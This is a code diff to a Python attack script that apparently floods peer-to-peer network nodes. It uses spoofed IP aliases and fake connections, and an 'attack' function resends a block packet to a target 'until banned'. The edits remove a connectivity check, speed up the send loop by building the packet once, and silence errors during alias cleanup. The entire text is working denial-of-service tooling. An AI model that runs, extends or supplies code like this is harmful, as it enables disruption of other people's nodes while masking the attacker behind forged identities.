@@ -72,14 +72,14 @@ def random_ip():
 	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
 
 # Checking the internet by sending a single ping to Google
-def internet_is_active():
-	return os.system('ping -c 1 google.com') == 0
+#def internet_is_active():
+#	return os.system('ping -c 1 google.com') == 0
 
 # If all else fails, we can use this to recover the network
-def reset_network():
-	print('Resetting network...')
-	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
-	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
+#def reset_network():
+#	print('Resetting network...')
+#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
+#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
 
 # Create an alias for a specified identity
 def ip_alias(ip_address):
@@ -218,11 +218,12 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 
 # Send version repeatedly, until banned
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
+	block = block_packet_bytes()
 	while True:
 		if seconds_between_version_packets != 0:
 			time.sleep(seconds_between_version_packets)
 		try:
-			socket.send(block_packet_bytes())
+			socket.send(block)
 		except Exception as e:
 			print(e)
 			break
@@ -283,10 +284,12 @@ def cleanup_iptables():
 # Remove all ip aliases that were created by the script
 def cleanup_ipaliases():
 	for i in range(0, len(identity_address)):
-		ip = identity_address[i][0]
-		interface = identity_interface[i]
-		print(f'Cleaning up IP alias {ip} on {interface}')
-		terminal(f'sudo ifconfig {interface} {ip} down')
+		try:
+			ip = identity_address[i][0]
+			interface = identity_interface[i]
+			print(f'Cleaning up IP alias {ip} on {interface}')
+			terminal(f'sudo ifconfig {interface} {ip} down')
+		except: pass
 
 # This function is ran when the script is stopped
 def on_close():
@@ -297,9 +300,9 @@ def on_close():
 	cleanup_iptables()
 	print('Cleanup complete. Goodbye.')
 
-	print('Verifying that internet works...')
-	if not internet_is_active():
-		reset_network()
+	#print('Verifying that internet works...')
+	#if not internet_is_active():
+	#	reset_network()
 
 
 # This is the first code to run
